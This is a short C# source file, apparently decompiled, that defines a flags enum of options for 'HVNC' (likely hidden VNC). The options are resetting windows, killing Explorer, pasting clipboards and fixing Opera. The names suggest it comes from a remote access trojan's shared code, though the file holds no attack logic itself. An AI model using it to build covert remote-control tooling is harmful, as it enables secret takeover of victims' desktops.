

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[Flags]
	[ProtoContract]
	public enum HvncOptions
	{
		None = 0,
		ResetAllWindows = 1,
		KillExplorer = 2,
		PasteClipboard = 4,
		PasteClientClipboard = 8,
		FixOpera = 16, // 0x00000010
	}
}